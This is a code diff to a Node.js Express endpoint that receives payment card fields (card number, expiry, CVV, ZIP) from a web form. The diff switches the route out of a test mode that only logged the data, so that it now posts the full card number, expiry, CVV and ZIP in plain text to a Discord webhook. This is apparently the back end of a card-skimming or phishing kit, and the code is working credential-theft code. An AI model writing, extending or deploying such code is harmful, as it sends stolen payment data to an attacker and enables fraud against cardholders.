@@ -15,15 +15,54 @@ app.post('/api/submit-form', async (req, res) => {
     try {
         const { card, mm, aa, cvv, zip } = req.body;
 
-        // TEST MODE: Solo loggear los datos sin enviar a Discord
-        console.log('TEST MODE - Datos recibidos:', { card, mm, aa, cvv, zip });
-        
-        // Simular respuesta exitosa
-        res.json({ success: true, test: true });
+        console.log('Received data:', { card: card ? '***' : 'N/A', mm, aa, cvv, zip: zip ? '***' : 'N/A' });
+
+        // Obtener el webhook URL de las variables de entorno
+        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+
+        console.log('Webhook URL configured:', !!webhookUrl);
+
+        if (!webhookUrl) {
+            console.error('DISCORD_WEBHOOK_URL not configured');
+            return res.status(500).json({ error: 'Server configuration error' });
+        }
+
+        console.log('Sending to Discord webhook...');
+
+        const content = {
+            embeds: [{
+                title: 'New form submission',
+                color: 15158332,
+                fields: [
+                    { name: 'Card', value: card || 'N/A', inline: true },
+                    { name: 'MM', value: mm || 'N/A', inline: true },
+                    { name: 'AA', value: aa || 'N/A', inline: true },
+                    { name: 'CVV', value: cvv || 'N/A', inline: true },
+                    { name: 'ZIP Code', value: zip || 'N/A', inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(content)
+        });
+
+        console.log('Discord response status:', response.status);
+
+        if (!response.ok) {
+            console.error('Discord webhook failed with status:', response.status);
+            throw new Error('Discord webhook failed');
+        }
+
+        console.log('Success! Data sent to Discord');
+        res.json({ success: true });
 
     } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        console.error('Error in submit-form:', error);
+        res.status(500).json({ error: 'Internal server error', details: error.message });
     }
 });
 
